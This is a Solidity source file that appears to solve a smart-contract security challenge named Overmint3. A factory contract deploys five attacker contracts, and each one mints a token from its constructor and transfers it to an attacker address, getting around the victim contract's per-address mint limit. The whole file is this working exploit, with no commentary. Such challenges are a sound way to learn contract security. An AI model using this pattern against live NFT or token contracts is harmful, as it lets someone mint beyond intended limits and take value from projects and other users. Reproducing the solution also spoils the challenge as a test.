// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

interface IOvermint3 {
  function mint() external;
  function transferFrom(address from, address to, uint256 tokenId) external;
}

contract Overmint3Attacker {
  constructor(address _victim, address _attacker, uint256 _tokenId) {
    IOvermint3(_victim).mint();

    IOvermint3(_victim).transferFrom(address(this), _attacker, _tokenId);
  }

}

contract Overmint3AttackerFactory {
    constructor(address _victim, address _attacker) {
      for(uint256 i = 0; i < 5; i++) {
        new Overmint3Attacker(_victim, _attacker, i+1);
      }
    }
}
